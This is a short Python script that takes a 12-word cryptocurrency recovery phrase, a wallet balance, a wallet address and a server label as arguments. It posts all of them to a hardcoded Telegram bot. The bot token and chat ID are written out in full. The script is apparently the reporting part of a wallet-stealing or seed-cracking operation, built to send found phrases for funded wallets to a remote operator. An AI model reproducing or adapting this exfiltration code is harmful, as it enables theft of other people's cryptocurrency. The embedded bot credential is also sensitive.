import requests, sys

#f_send_telegram.py 1 2 3 4 5 6 7 8 9 10 11 12 100 x0aaaa serv1

mnemonic=str(sys.argv[1]+" "+sys.argv[2]+" "+sys.argv[3]+" "+sys.argv[4]+" "+sys.argv[5]+" "+sys.argv[6]+" "+sys.argv[7]+" "+sys.argv[8]+" "+sys.argv[9]+" "+sys.argv[10]+" "+sys.argv[11]+" "+sys.argv[12])
balance=int(sys.argv[13])
wallet=str(sys.argv[14])
serv_name=str(sys.argv[15])

def envia_mensagem(mnemonic,balance,wallet,serv_name):
    payload = {'chat_id': '139945866', 'text': '🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢\n🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢\n\n\n\n\n\n\n\n\n\n\n\n\n'+str(serv_name)+'\nPhrase:'+str(mnemonic)+' \nBalance: '+str(balance)+' \nWallet: '+str(wallet)+'\n\n\n\n\n\n\n\n\n\n\n🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢\n🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢'}
    r = requests.post("https://api.telegram.org/bot6534285154:AAEzeSG2Nvyn46uGD88VeC2eREAiW80SntA/sendMessage", data=payload)

envia_mensagem(mnemonic,balance,wallet,serv_name)